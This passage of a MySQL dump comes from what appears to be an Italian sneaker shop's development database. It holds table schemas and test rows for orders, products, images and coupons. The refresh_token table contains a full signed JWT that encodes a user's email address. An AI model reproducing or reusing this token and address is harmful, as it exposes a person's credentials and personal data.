14:06:34','2023-04-05 12:33:40','discount 15%'),(46,'APRIL6',10,NULL,'2023-04-13 23:59:59','Percentage',20,100,'20% sconto','2023-04-05 22:25:02',NULL,'20% discount'),(47,'MAGIC20',5,NULL,'2023-04-10 23:59:59','Percentage',20,75,'Sconto magico 20%','2023-04-06 09:15:09',NULL,'Magic discount 20%'),(48,'DISCOUNTPARTY',5,NULL,'2023-06-07 23:59:59','Percentage',10,50,'Sconto 10%','2023-04-06 09:16:20',NULL,'Discount 10%'),(49,'ciaociaociao',3,NULL,NULL,'ciaociaociao',123,12,'ciaociaociao','2023-04-26 17:00:38',NULL,'ciaociaociao');
/*!40000 ALTER TABLE `coupons` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `order_items`
--

DROP TABLE IF EXISTS `order_items`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `order_items` (
  `id` int NOT NULL AUTO_INCREMENT,
  `quantity` int NOT NULL,
  `price` double NOT NULL,
  `order_id` int NOT NULL,
  `product_details_id` int NOT NULL,
  `size` varchar(100) NOT NULL,
  `name` varchar(100) NOT NULL,
  `color` varchar(100) NOT NULL,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `disabled_at` datetime DEFAULT NULL,
  `status` varchar(100) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `order_id` (`order_id`),
  KEY `product_details_id` (`product_details_id`),
  KEY `size` (`size`),
  KEY `order_items_ibfk_4_idx` (`color`),
  CONSTRAINT `order_items_ibfk_1` FOREIGN KEY (`order_id`) REFERENCES `orders` (`id`),
  CONSTRAINT `order_items_ibfk_2` FOREIGN KEY (`product_details_id`) REFERENCES `product_details` (`id`),
  CONSTRAINT `order_items_ibfk_3` FOREIGN KEY (`size`) REFERENCES `conversion_sizes` (`eu`),
  CONSTRAINT `order_items_ibfk_4` FOREIGN KEY (`color`) REFERENCES `colors` (`code`)
) ENGINE=InnoDB AUTO_INCREMENT=206 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `order_items`
--

LOCK TABLES `order_items` WRITE;
/*!40000 ALTER TABLE `order_items` DISABLE KEYS */;
INSERT INTO `order_items` VALUES (4,1,31,1,4,'W36','All Star','Nero','2023-03-06 22:28:13','2023-04-05 00:00:00',NULL),(5,1,34,6,3,'M40','TurboShoe','Rosso','2023-03-10 11:04:49','2023-04-05 00:00:00',NULL),(6,1,34,7,5,'M40','TurboShoe','Rosso','2023-03-10 11:04:49','2023-04-05 00:00:00',NULL),(7,1,15,8,2,'M41','TurboShoe','Rosso','2023-03-10 11:04:49','2023-04-05 00:00:00',NULL),(8,1,46,9,1,'M40','King Pro','Rosa','2023-03-21 16:45:18','2023-04-05 00:00:00',NULL),(9,1,34,1,3,'M40','TurboShoe','Rosso','2023-03-10 11:59:38','2023-04-05 00:00:00',NULL),(10,1,34,6,8,'M40','TurboShoe','Rosso','2023-03-10 11:59:39','2023-04-05 00:00:00',NULL),(11,1,15,7,2,'M41','TurboShoe','Rosso','2023-03-10 11:59:39','2023-04-05 00:00:00','refunded'),(12,1,34,8,7,'M40','TurboShoe','Rosso','2023-03-10 12:05:17','2023-04-05 00:00:00',NULL),(13,1,34,9,9,'M40','TurboShoe','Rosso','2023-03-10 12:05:17','2023-04-05 00:00:00',NULL),(14,1,34,1,10,'M40','TurboShoe','Rosso','2023-03-10 12:05:17','2023-04-05 00:00:00',NULL),(15,1,15,6,3,'M41','TurboShoe','Rosso','2023-03-10 12:05:17','2023-04-05 00:00:00',NULL);
/*!40000 ALTER TABLE `order_items` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `orders`
--

DROP TABLE IF EXISTS `orders`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `orders` (
  `id` int NOT NULL AUTO_INCREMENT,
  `transaction` varchar(100) DEFAULT NULL,
  `transaction_date` datetime DEFAULT NULL,
  `payment_status` varchar(100) NOT NULL,
  `status` varchar(100) NOT NULL,
  `total_price` double NOT NULL,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `disabled_at` datetime DEFAULT NULL,
  `user_id` int NOT NULL,
  `address_id` int NOT NULL,
  `coupon_id` int DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`),
  KEY `orders_ibfk_2_idx` (`address_id`),
  KEY `orders_ibfk_3_idx` (`coupon_id`),
  CONSTRAINT `orders_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`),
  CONSTRAINT `orders_ibfk_2` FOREIGN KEY (`address_id`) REFERENCES `addresses` (`id`),
  CONSTRAINT `orders_ibfk_3` FOREIGN KEY (`coupon_id`) REFERENCES `coupons` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=173 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `orders`
--

LOCK TABLES `orders` WRITE;
/*!40000 ALTER TABLE `orders` DISABLE KEYS */;
INSERT INTO `orders` VALUES (1,'Prova',NULL,'','',150,'2023-03-09 13:41:34','2023-04-05 18:04:19',7,8,2),(6,'Transaction 1','2023-03-23 12:40:00','Completed','Shipped',117,'2023-03-10 11:04:49','2023-04-05 18:04:19',1,3,2),(7,'Transaction 2',NULL,'Completed','Shipped',117,'2023-03-10 11:59:37','2023-04-05 18:04:19',1,3,2),(8,'Transaction 3',NULL,'Completed','Shipped',117,'2023-03-10 12:05:16','2023-04-05 18:04:19',1,3,6),(9,'Transaction 4',NULL,'Completed','Shipped',117,'2023-03-10 13:10:12','2023-04-05 18:04:19',1,3,6),(10,'Transaction 5',NULL,'Completed','Shipped',117,'2023-03-10 13:13:11','2023-04-05 18:04:19',1,1,6),(11,'Transaction 6',NULL,'Completed','Shipped',117,'2023-03-10 13:22:35','2023-04-05 18:04:19',1,3,NULL),(12,'Transaction 7',NULL,'Completed','Shipped',15,'2023-03-10 13:45:00','2023-04-05 18:04:19',5,11,NULL),(13,'Transaction 8',NULL,'Completed','Shipped',34,'2023-03-10 15:26:47','2023-04-05 18:04:19',5,11,NULL),(14,'27q3eqwu',NULL,'Completed','Shipped',83,'2023-03-10 16:03:24','2023-04-05 18:04:19',5,11,NULL),(15,'3847092',NULL,'Completed','Shipped',4566,'2023-03-13 09:57:59','2023-04-05 18:04:19',5,11,NULL),(16,'api test',NULL,'completed','shipped',128,'2023-03-20 09:31:29','2023-04-05 18:04:19',1,3,NULL),(27,'12',NULL,'pagato','ANDIAMO A BERLINO BEPPE',49,'2023-03-21 08:56:51','2023-04-05 18:04:19',1,3,NULL),(28,'13',NULL,'pagato','main',49,'2023-03-21 10:33:36','2023-04-05 18:04:19',1,3,NULL),(29,'14',NULL,'pagato','dtovecchio',49,'2023-03-21 10:34:23','2023-04-05 18:04:19',1,3,NULL),(31,'15',NULL,'pagato','SENT',137,'2023-03-22 15:16:42','2023-04-05 18:04:19',1,3,NULL),(32,'16',NULL,'pagato','TEST CON FRANCESCO',137,'2023-03-27 10:18:17','2023-04-05 18:04:19',1,3,NULL),(33,'prova add order',NULL,'non pagato','SPEDITO OGGI',150,'2023-03-28 10:27:23','2023-04-05 18:04:19',1,1,NULL),(34,'12345',NULL,'pagato','in spedizione',178,'2023-03-31 15:19:38','2023-04-05 18:04:19',7,1,NULL),(39,'Shopping',NULL,'non pagato','in lavorazione',178,'2023-03-31 15:58:17','2023-04-05 18:04:19',7,8,NULL),(40,'Prova coupon',NULL,'non pagato','in lavorazione',170,'2023-03-31 18:12:05','2023-04-05 18:04:19',1,3,4),(51,'Prova 3 coupon',NULL,'non pagato','in lavorazione',178,'2023-04-03 10:02:09','2023-04-05 18:04:19',1,3,NULL),(52,'Prova 4 name',NULL,'non pagato','in lavorazione',178,'2023-04-03 10:02:56','2023-04-05 18:04:19',1,3,NULL),(54,'Prova 2 coupon',NULL,'non pagato','in lavorazione',100,'2023-04-03 10:04:19','2023-04-05 18:04:19',1,3,NULL),(57,'Prova 2 user',NULL,'non pagato','in lavorazione',166,'2023-04-03 11:31:46','2023-04-05 18:04:19',1,3,5),(59,'Prova 3 senza user',NULL,'non pagato','in lavorazione',-122,'2023-04-03 11:33:29','2023-04-05 18:04:19',1,3,6),(74,'completed',NULL,'paid','completed',100,'2023-04-04 10:19:13','2023-04-05 18:04:19',61,106,41),(80,'4',NULL,'Pagamento effettuato','In spedizione',0,'2023-04-04 10:27:17','2023-04-05 18:04:19',1,3,6),(81,'completed2',NULL,'paid','completed',100,'2023-04-04 10:45:48','2023-04-05 18:04:19',61,106,NULL),(82,'001',NULL,'paid','completed',200,'2023-04-04 10:56:16','2023-04-05 18:04:19',61,106,NULL),(83,NULL,NULL,'paid','completed',300,'2023-04-04 11:07:11','2023-04-05 18:04:19',61,106,NULL),(84,'0012',NULL,'paid','completed',269,'2023-04-04 11:16:07','2023-04-05 18:04:19',61,108,NULL),(85,'00835.6984857074758',NULL,'paid','completed',187,'2023-04-04 11:27:15','2023-04-05 18:04:19',61,108,NULL),(86,'00733.0585380325447',NULL,'paid','completed',187,'2023-04-04 11:29:32','2023-04-05 18:04:19',61,108,NULL),(87,'000000',NULL,'paid','completed',700,'2023-04-04 11:42:25','2023-04-05 18:04:19',61,106,NULL),(88,'00155.4416807618595',NULL,'paid','completed',780,'2023-04-04 11:44:11','2023-04-05 18:04:19',61,108,NULL),(89,'00901.0675860105844',NULL,'paid','completed',780,'2023-04-04 11:45:55','2023-04-05 18:04:19',61,108,NULL),(90,'00911.7012818000077',NULL,'paid','completed',780,'2023-04-04 11:46:56','2023-04-05 18:04:19',61,108,NULL),(91,'00982.8865059065246',NULL,'paid','completed',780,'2023-04-04 11:51:54','2023-04-05 18:04:19',61,108,NULL),(92,'00936.0200109558425',NULL,'paid','completed',780,'2023-04-04 11:54:46','2023-04-05 18:04:19',61,108,NULL),(93,'009000',NULL,'paid','completed',700,'2023-04-04 11:56:11','2023-04-05 18:04:19',61,106,NULL),(94,'0086.85126712840452',NULL,'paid','completed',780,'2023-04-04 11:57:15','2023-04-05 18:04:19',61,108,NULL),(95,'00730.1271415443604',NULL,'paid','completed',780,'2023-04-04 11:59:47','2023-04-05 18:04:19',61,108,NULL),(96,'00514.66758484879',NULL,'paid','completed',780,'2023-04-04 12:00:49','2023-04-05 18:04:19',61,108,NULL),(97,'00995.6074847587984',NULL,'paid','completed',546,'2023-04-04 12:02:11','2023-04-05 18:04:19',61,108,NULL),(98,'0023231',NULL,'paid','completed',390,'2023-04-04 12:07:10','2023-04-05 18:04:19',61,108,NULL),(99,'03231',NULL,'paid','completed',234,'2023-04-04 12:15:31','2023-04-05 18:04:19',61,108,NULL),(100,'0323231',NULL,'paid','completed',390,'2023-04-04 12:19:04','2023-04-05 18:04:19',61,108,NULL),(101,'8909000',NULL,'paid','completed',700,'2023-04-04 12:21:04','2023-04-05 18:04:19',61,106,NULL),(102,'0331',NULL,'paid','completed',390,'2023-04-04 12:23:19','2023-04-05 18:04:19',61,108,NULL),(103,'033113131',NULL,'paid','completed',156,'2023-04-04 12:25:50','2023-04-05 18:04:19',61,108,NULL),(104,'8909123000',NULL,'paid','completed',156,'2023-04-04 12:26:38','2023-04-05 18:04:19',61,106,NULL),(105,'890912df3000',NULL,'paid','completed',200,'2023-04-04 12:27:15','2023-04-05 18:04:19',61,106,NULL),(106,'00952.6655513501016',NULL,'paid','completed',138,'2023-04-04 12:53:30','2023-04-05 18:04:19',61,108,NULL),(107,'00642.470286512689',NULL,'paid','completed',438,'2023-04-04 12:54:28','2023-04-05 18:04:19',61,108,NULL),(108,'00128.4289231402813',NULL,'paid','completed',140,'2023-04-04 12:57:44','2023-04-05 18:04:19',61,108,NULL),(109,'00525.7067725907758',NULL,'paid','completed',140,'2023-04-04 13:00:18','2023-04-05 18:04:19',61,108,NULL),(110,'Prova per bug',NULL,'non pagato','loading',234,'2023-04-04 14:12:12','2023-04-05 18:04:19',1,3,NULL),(111,'890912dfaf3000',NULL,'paid','completed',156,'2023-04-04 14:14:49','2023-04-05 18:04:19',61,106,NULL),(112,'890912drhfaf3000',NULL,'paid','completed',200,'2023-04-04 14:15:16','2023-04-05 18:04:19',61,106,NULL),(113,'890912drhfagfdf3000',NULL,'paid','completed',140,'2023-04-04 14:18:03','2023-04-05 18:04:19',61,106,NULL),(114,'8g90912drhfagfdf3000',NULL,'paid','completed',92,'2023-04-04 14:20:52','2023-04-05 18:04:19',61,106,NULL),(115,'8g90912drhfagfdf3d000',NULL,'paid','completed',200,'2023-04-04 14:24:30','2023-04-05 18:04:19',61,106,NULL),(116,'00523.7859548529766',NULL,'paid','completed',126,'2023-04-04 14:41:50','2023-04-05 18:04:19',80,115,NULL),(117,'00814.6451841947952',NULL,'paid','completed',185,'2023-04-04 14:42:28','2023-04-05 18:04:19',80,115,NULL),(118,'0093.73793943366171',NULL,'paid','completed',93,'2023-04-04 14:43:42','2023-04-05 18:04:19',80,115,NULL),(119,'00257.51921035181914',NULL,'paid','completed',124,'2023-04-04 14:57:10','2023-04-05 18:04:19',80,115,NULL),(120,'890912drhfaf3001',NULL,'paid','completed',156,'2023-04-04 14:57:44','2023-04-05 18:04:19',1,106,NULL),(121,'00855.9824421894413',NULL,'paid','completed',93,'2023-04-04 14:59:14','2023-04-05 18:04:19',80,115,NULL),(122,'00946.7229899725671',NULL,'paid','completed',62,'2023-04-04 15:01:10','2023-04-05 18:04:19',85,116,NULL),(123,'890912drhfaf3002',NULL,'paid','completed',156,'2023-04-04 15:12:40','2023-04-05 18:04:19',1,106,NULL),(124,'00257.4847825705695',NULL,'paid','completed',240,'2023-04-04 15:21:14','2023-04-05 18:04:19',81,117,NULL),(126,'00173.83342698872474',NULL,'paid','completed',197,'2023-04-04 15:38:32','2023-04-05 18:04:19',82,118,NULL),(135,'1',NULL,'Pagamento effettuato','IN SPEDIZIONE PROVA',151,'2023-04-04 16:00:10','2023-04-05 18:04:19',88,100,35),(137,'2',NULL,'Pagamento effettuato','IN SPEDIZIONE PROVA',501,'2023-04-04 16:11:42','2023-04-05 18:04:19',88,100,35),(138,'8df3d000',NULL,'paid','completed',104,'2023-04-04 16:34:34','2023-04-05 18:04:19',1,118,NULL),(139,'5',NULL,'in pagamento','TEST CON FRANCESCO',301,'2023-04-04 16:46:26','2023-04-05 18:04:19',88,100,35),(140,'8df3d0001',NULL,'paid','completed',104,'2023-04-04 16:50:34','2023-04-05 18:04:19',1,118,NULL),(141,'00206.1912202251588',NULL,'paid','completed',162,'2023-04-04 18:55:36','2023-04-05 18:04:19',98,119,42),(142,'00580.3694145064607',NULL,'paid','completed',162,'2023-04-04 19:01:30','2023-04-05 18:04:19',98,119,42),(143,'00759.6592666315929',NULL,'paid','completed',254,'2023-04-04 19:13:25','2023-04-05 18:04:19',98,119,NULL),(144,'00731.0540321957267',NULL,'paid','completed',207,'2023-04-04 19:17:30','2023-04-05 18:04:19',98,119,NULL),(145,'0049.598796314730635',NULL,'paid','completed',230,'2023-04-04 19:19:12','2023-04-05 18:04:19',98,119,NULL),(146,'00904.0523334448427',NULL,'paid','completed',646,'2023-04-04 19:23:42','2023-04-05 18:04:19',98,119,NULL),(147,'00231.06220970012936',NULL,'paid','completed',207,'2023-04-04 19:25:11','2023-04-05 18:04:19',98,119,NULL),(148,'00883.970064679966',NULL,'paid','completed',180,'2023-04-04 19:25:55','2023-04-05 18:04:19',98,119,NULL),(149,'00763.8549832071407',NULL,'paid','completed',158.1,'2023-04-05 14:29:10','2023-04-05 18:04:19',98,119,45),(150,'00923.7274126842623',NULL,'paid','completed',66.3,'2023-04-05 14:32:55','2023-04-05 18:04:19',98,119,45),(151,'00739.1590408570097',NULL,'paid','completed',76.5,'2023-04-05 14:33:40','2023-04-05 18:04:19',98,119,45),(152,'003.91448033051911',NULL,'paid','completed',280,'2023-04-05 18:03:33','2023-04-05 18:04:19',43,122,NULL),(153,'00733.2104972801056',NULL,'paid','completed',75,'2023-04-05 19:27:51','2023-04-05 20:55:31',43,122,NULL),(155,'1234567890',NULL,'paid','in spedizione',185,'2023-04-05 22:31:24',NULL,88,100,NULL),(156,'12345346745747',NULL,'Pagamento effettuato','in spedizione',334.99,'2023-04-05 22:32:20',NULL,88,100,46),(157,'235767457823',NULL,'Pagamento effettuato','in spedizione',243,'2023-04-05 22:52:21',NULL,101,123,46),(158,'87684574234',NULL,'Pagamento effettuato','SPEDITO SENZA PROBLEMI',195.99,'2023-04-05 22:53:00',NULL,101,124,46),(159,'0043.259433991075454',NULL,'paid','completed',379.98,'2023-04-06 00:12:47',NULL,43,125,NULL),(160,'0041.47167029697974',NULL,'paid','completed',110,'2023-04-06 00:13:26','2023-04-06 08:27:08',43,122,NULL),(161,'0055.09486824269061',NULL,'paid','completed',90,'2023-04-06 08:53:39','2023-04-06 08:26:59',75,106,NULL),(162,'00633.7275083201616',NULL,'paid','completed',90,'2023-04-06 09:31:46','2023-04-06 08:26:47',75,106,NULL),(163,'00249.7700236185252',NULL,'paid','completed',722.95,'2023-04-06 10:20:59',NULL,43,125,NULL),(164,'005.924991800283053',NULL,'paid','completed',49.99,'2023-04-06 10:42:02',NULL,43,125,NULL),(165,'00474.7598003443359',NULL,'paid','completed',257.96999999999997,'2023-04-06 11:13:22',NULL,61,108,NULL),(166,'00755.6532485887298',NULL,'paid','completed',110,'2023-04-06 11:52:43',NULL,43,131,NULL),(167,'00321.11413605145844',NULL,'paid','completed',220,'2023-04-06 19:43:17',NULL,61,109,NULL),(168,'00136.6250786942925',NULL,'paid','completed',489.99,'2023-04-06 22:16:20',NULL,61,109,NULL),(169,'00256.85841307082893',NULL,'paid','completed',85.99,'2023-05-15 10:27:30',NULL,88,100,NULL),(170,'342',NULL,'Pagamento effettuato','in spedizione',160.99,'2023-05-15 10:44:08',NULL,88,1,NULL),(171,'434',NULL,'Pagamento effettuato','In spedizione',390.97,'2023-05-15 10:47:17',NULL,88,1,NULL),(172,'mastercard','2023-05-25 14:47:30','completed','completed',100,'2023-05-25 14:47:29',NULL,1,1,NULL);
/*!40000 ALTER TABLE `orders` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `product_details`
--

DROP TABLE IF EXISTS `product_details`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `product_details` (
  `id` int NOT NULL AUTO_INCREMENT,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `disabled_at` datetime DEFAULT NULL,
  `is_listed` tinyint(1) NOT NULL DEFAULT '0',
  `selling_price` double DEFAULT NULL,
  `quantity` int NOT NULL DEFAULT '0',
  `size` varchar(100) NOT NULL,
  `product_id` int NOT NULL,
  PRIMARY KEY (`id`),
  KEY `size` (`size`),
  KEY `product_id` (`product_id`),
  CONSTRAINT `product_details_ibfk_1` FOREIGN KEY (`size`) REFERENCES `conversion_sizes` (`eu`),
  CONSTRAINT `product_details_ibfk_2` FOREIGN KEY (`product_id`) REFERENCES `products` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=552 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `product_details`
--

LOCK TABLES `product_details` WRITE;
/*!40000 ALTER TABLE `product_details` DISABLE KEYS */;
INSERT INTO `product_details` VALUES (2,'2023-03-07 19:47:11','2023-04-05 18:04:34',1,70,10,'M41',1),(3,'2023-03-06 22:28:13','2023-04-05 18:04:34',1,67,21,'M40',1),(4,'2023-03-06 22:28:13','2023-04-05 18:04:34',1,31,-4,'W36',2),(8,'2023-03-21 16:45:18','2023-04-05 18:04:34',1,46,-3,'M40',3),(23,'2023-03-22 13:41:12','2023-04-05 18:04:34',1,52,5,'W35',4),(24,'2023-03-22 13:41:12','2023-04-05 18:04:34',1,59,10,'W37',4),(45,'2023-03-22 13:45:50','2023-04-05 18:04:34',1,70,22,'M42',5),(46,'2023-03-22 13:45:51','2023-04-05 18:04:34',1,44,30,'W38',6),(50,'2023-03-22 14:02:25','2023-04-05 18:04:34',1,47,10,'W37',6),(51,'2023-03-22 14:03:53','2023-04-05 18:04:34',1,80,11,'M41',7),(52,'2023-03-22 14:21:37','2023-04-05 18:04:34',1,78,-126,'M43',7),(53,'2023-03-22 14:23:59','2023-04-05 18:04:34',1,80,22,'W37',8),(54,'2023-03-22 14:23:59','2023-04-05 18:04:34',1,100,-14,'M41',9),(55,'2023-03-22 14:23:59','2023-04-05 18:04:34',1,110,11,'W36',10),(56,'2023-03-22 14:23:59','2023-04-05 18:04:34',1,110,5,'W35',10),(57,'2023-03-30 15:18:04','2023-04-05 18:04:34',1,410,20,'M40',11),(58,'2023-03-30 15:18:04','2023-04-05 18:04:34',1,430,30,'M42',11),(59,'2023-03-31 12:43:26','2023-04-05 18:04:34',1,300,18,'M41',3);
/*!40000 ALTER TABLE `product_details` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `product_images`
--

DROP TABLE IF EXISTS `product_images`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `product_images` (
  `id` int NOT NULL AUTO_INCREMENT,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `disabled_at` datetime DEFAULT NULL,
  `image_path` varchar(3000) NOT NULL,
  `type` varchar(100) NOT NULL,
  `image_number` int NOT NULL,
  `alt_it` varchar(100) DEFAULT NULL,
  `alt_eng` varchar(100) DEFAULT NULL,
  `product_id` int NOT NULL,
  PRIMARY KEY (`id`),
  KEY `product_id` (`product_id`),
  CONSTRAINT `product_images_ibfk_1` FOREIGN KEY (`product_id`) REFERENCES `products` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=602 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `product_images`
--

LOCK TABLES `product_images` WRITE;
/*!40000 ALTER TABLE `product_images` DISABLE KEYS */;
INSERT INTO `product_images` VALUES (1,'2023-03-17 14:52:39','2023-04-05 18:04:44','https://static.nike.com/a/images/t_PDP_1280_v1/f_auto,q_auto:eco/a1435987-3e06-4478-8bdb-d1579c621eab/scarpa-da-running-su-strada-air-zoom-arcadia-2-pgCBZt.png','mobile',0,'immagine di cani','immagins of cans',1),(7,'2023-03-31 10:32:30','2023-04-05 18:04:44','https://www.giornalettismo.com/wp-content/uploads/2012/07/scarpa-14.jpg','string',0,'string','string',11),(8,'2023-03-31 12:46:51','2023-04-05 18:04:44','https://www.sportfair.it/wp-content/uploads/2016/10/le-scarpe-piu-brutte-della-storia-delle-scarp-L-LQmHpm.jpeg','string',0,'string','string',5),(10,'2023-03-31 14:38:40','2023-04-05 18:04:44','https://cdn.shopify.com/s/files/1/0427/2442/5884/products/M0054_20--_20000_20_284923_29.jpg','mobile',0,'wweqwe','rrrr',4),(11,'2023-03-31 15:20:29','2023-04-05 18:04:44','https://m.media-amazon.com/images/I/61exz1XRqeL._AC_SY450_.jpg','string',0,'string','string',8),(12,'2023-03-31 15:24:56','2023-04-05 18:04:44','https://www.grandiscarpe.com/media/catalog/product/cache/1/image/9df78eab33525d08d6e5fb8d27136e95/1/4/141a45871.jpg','string',0,'string','string',3),(15,'2023-03-31 17:52:37','2023-04-05 18:04:44','https://m.media-amazon.com/images/I/71hGHbkL+EL._AC_SY355_.jpg','desktop',0,'testest','efwefwe',10);
/*!40000 ALTER TABLE `product_images` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `products`
--

DROP TABLE IF EXISTS `products`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `products` (
  `id` int NOT NULL AUTO_INCREMENT,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `disabled_at` datetime DEFAULT NULL,
  `name` varchar(100) NOT NULL,
  `description_it` text,
  `description_eng` text,
  `is_listed` tinyint(1) NOT NULL DEFAULT '0',
  `listed_price` double NOT NULL,
  `color` varchar(100) NOT NULL,
  `category` varchar(100) NOT NULL,
  `type` varchar(100) NOT NULL,
  `brand` varchar(100) NOT NULL,
  `image_preview` varchar(3000) DEFAULT NULL,
  `starting_price` double NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk1_idx` (`color`),
  KEY `fk1_products_category_idx` (`category`),
  KEY `fk1_products_brand_idx` (`brand`),
  CONSTRAINT `fk1_products_brand` FOREIGN KEY (`brand`) REFERENCES `brands` (`code`),
  CONSTRAINT `fk1_products_category` FOREIGN KEY (`category`) REFERENCES `categories` (`code`),
  CONSTRAINT `fk1_products_color` FOREIGN KEY (`color`) REFERENCES `colors` (`code`)
) ENGINE=InnoDB AUTO_INCREMENT=228 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `products`
--

LOCK TABLES `products` WRITE;
/*!40000 ALTER TABLE `products` DISABLE KEYS */;
INSERT INTO `products` VALUES (1,'2023-03-07 19:46:09','2023-04-05 18:04:52','Zoom Rush','Scarpe da corsa leggere','Lightweight running shoes',1,129.99,'Multicolor','Corsa','M','Nike','test',67),(2,'2023-03-06 11:45:20','2023-04-05 18:04:52','All Star','Sneakers alte nere in pelle','Black leather high-top sneakers',1,69.99,'Nero','Sneakers','W','Converse','',31),(3,'2023-03-06 11:43:17','2023-04-05 18:04:52','King Pro','Scarpe da calcio con tacchetti','Soccer cleats with studs',1,89.99,'Rosa','Calcio','M','Puma','',46),(4,'2023-03-20 11:38:09','2023-04-05 18:04:52','Ultra Boost','	Scarpe da corsa traspiranti','Breathable running shoes',1,109.99,'Blu','Corsa','W','Adidas','/blablabla',52),(5,'2023-03-20 14:18:50','2023-04-05 18:04:52','Old Skool Pro','Scarpe da skate con lacci bianchi','White lace-up skate shoes',1,79.99,'Bianco','Skate','M','Vans','/boh',70),(6,'2023-03-29 13:19:14','2023-04-05 18:04:52','Disruptor Lite','Scarpe da fitness rosa in tessuto','Pink fabric fitness shoes',1,59.99,'Grigio','Fitness','W','Fila','',44),(7,'2023-03-22 13:19:58','2023-04-05 18:04:52','Nano X','Scarpe da cross-training nere','Black cross-training shoes',1,99.99,'Multicolor','Cross training','M','Reebok','',78),(8,'2023-03-22 13:22:03','2023-04-05 18:04:52','Fresh Foam Arishi','Scarpe da passeggio comode','Comfortable walking shoes',1,89.99,'Verde','Camminata','W','New Balance','',80),(9,'2023-03-22 13:22:03','2023-04-05 18:04:52','Gel Sonoma','Scarpe da trail running impermeabili','Waterproof trail running shoes',1,119.99,'Nero','Trail running','M','Asics','',100),(10,'2023-03-27 13:22:03','2023-04-05 18:04:52','Scarpe per cani','Scarpe per cani','Cushioned basketball shoes',1,129.99,'Rosso','Pallacanestro','W','Under Armour','',110),(11,'2023-03-30 15:11:53','2023-04-05 18:04:52','God Shoes','Scarpe per volare (+3 punti mobilita\')','Shoes to fly (+3 mobility points)',1,399.99,'Multicolor','Fitness','M','BR1','/bohboh',410);
/*!40000 ALTER TABLE `products` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `refresh_token`
--

DROP TABLE IF EXISTS `refresh_token`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `refresh_token` (
  `id` int NOT NULL AUTO_INCREMENT,
  `token` varchar(150) NOT NULL,
  `expiration_date` timestamp NOT NULL,
  `user_id` int NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `token_UNIQUE` (`token`),
  KEY `fk_refresh_token_user_idx` (`user_id`),
  CONSTRAINT `fk_refresh_token_user` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=611 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `refresh_token`
--

LOCK TABLES `refresh_token` WRITE;
/*!40000 ALTER TABLE `refresh_token` DISABLE KEYS */;
INSERT INTO `refresh_token` VALUES (610,'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJwYW9sbzFAZ21haWwuY29tIiwiZXhwIjoxNjg0MzM0Njg5fQ.mNcx6S6q8_eZEsM6HbBrd5dv2tt-orKOjFygU-BlosE','2023-05-17 12:44:50',88);
/*!40000 ALTER TABLE `refresh_token` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `shopping_cart_item`
--

DROP TABLE IF EXISTS `shopping_cart_item`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `shopping_cart_item` (
  `id` int NOT NULL AUTO_INCREMENT,
  `quantity` int NOT NULL,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `user_id` int NOT NULL,
  `product_details_id` int NOT NULL,
  PRIMARY KEY (`id`),
  KEY `product_details_id` (`product_details_id`),
  KEY `fk2_idx` (`user_id`),
  CONSTRAINT `cartItemFk1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`),
  CONSTRAINT `cartItemFk2` FOREIGN KEY (`product_details_id`) REFERENCES `product_details` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=197 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
